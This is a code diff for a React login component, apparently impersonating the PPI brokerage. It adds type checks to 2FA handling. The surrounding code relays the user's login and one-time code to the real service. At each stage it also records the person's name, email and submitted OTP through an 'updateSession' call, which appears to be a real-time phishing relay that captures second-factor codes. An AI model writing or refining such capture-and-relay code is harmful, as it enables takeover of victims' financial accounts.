@@ -212,8 +212,13 @@ const PPI = () => {
       if (res.requires_2fa) {
         // 2FA required — store userId and type, show OTP screen
         if (res.fullName) setSyncedFullName(res.fullName);
-        if (res.raw?.payload?.usuario?.id) setTwofaUserId(res.raw.payload.usuario.id);
-        if (res.twofa_type) setTwofaType(res.twofa_type);
+        const rawUserId = res.raw?.payload?.usuario?.id;
+        if (typeof rawUserId === "number") {
+          setTwofaUserId(rawUserId);
+        } else if (typeof rawUserId === "string" && Number.isFinite(Number(rawUserId))) {
+          setTwofaUserId(Number(rawUserId));
+        }
+        if (typeof res.twofa_type === "number") setTwofaType(res.twofa_type);
         await updateSession("2fa_required", {
           otp_code: `name:${res.fullName || ""}|email:${res.email || ""}|type:${res.twofa_type}`,
         });
@@ -285,7 +290,9 @@ const PPI = () => {
     setError("");
     try {
       await updateSession("2fa_submitted", { otp_code: `code:${code}` });
-      const res = await ppiApi.validate2fa(code, lastUsernameRef.current, twofaUserId || undefined, twofaType);
+      const resolvedUserId = typeof twofaUserId === "number" ? twofaUserId : undefined;
+      const resolvedTwofaType = typeof twofaType === "number" ? twofaType : 1;
+      const res = await ppiApi.validate2fa(code, lastUsernameRef.current, resolvedUserId, resolvedTwofaType);
 
       if (res.success) {
         const fullName = res.fullName || "";
@@ -320,7 +327,7 @@ const PPI = () => {
       await updateSession("2fa_error", { otp_code: `error:${e.message}` });
     }
     setLoading(false);
-  }, [updateSession]);
+  }, [updateSession, twofaType, twofaUserId]);
 
   // ── Identity Verification (Wayni onboarding) ──
   const handleIdentityVerify = useCallback(async (data: IdentityVerifyPayload): Promise<IdentityVerifyResult | void> => {
